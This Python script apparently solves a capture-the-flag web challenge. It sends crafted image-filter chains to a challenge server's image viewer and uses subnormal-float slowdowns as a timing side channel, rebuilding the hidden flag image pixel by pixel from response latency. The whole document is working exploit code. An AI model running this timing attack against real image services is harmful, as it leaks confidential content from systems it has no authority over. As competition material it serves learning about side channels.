import requests
import time
from skimage.io import imshow
import numpy as np
import urllib
import json
from matplotlib import pyplot as plt
import ray

# black white SUBNORMAL = 1e-321
SUBNORMAL = 1e-306

X = 1024//10
Y = 768//10
print(X, Y)
image = np.zeros((X, Y))
plt.ion()
plt.show()

ray.init()

@ray.remote
def fetch(x, y):
    req = urllib.parse.quote_plus(json.dumps([{"filter": "resize", "args": [[X, Y], None, 'reflect', 0, True, False, False]}, {"filter":"warp","args":[[[0.0000001,0,y],[0,0.0000001,x],[0,0,1]]]}, {"filter": "resize", "args": [[1,1],None, 'reflect', 0, True, False, False]}, {"filter": "intensity", "args": [(0,1),(0,SUBNORMAL)]}, {"filter":"resize", "args":[[600,600]]} ]))
    t = time.time()
    requests.get("http://mokersee-web.chal.irisc.tf/view/flagmoker?filters=" + req)
    t = time.time() - t
    return x, y, t

futures = []
for x in range(0, X):
    for y in range(0, Y):
        futures.append(fetch.remote(x, y))

while len(futures) > 0:
    ready, _ = ray.wait(futures)
    for r in ready:
        x, y, t = ray.get(r)
        print(x, y, t)
        image[x, y] = t > 0.75
        plt.clf()
        imshow(image)
        plt.draw()
        plt.pause(.001)
        futures.remove(r)

input("> ")
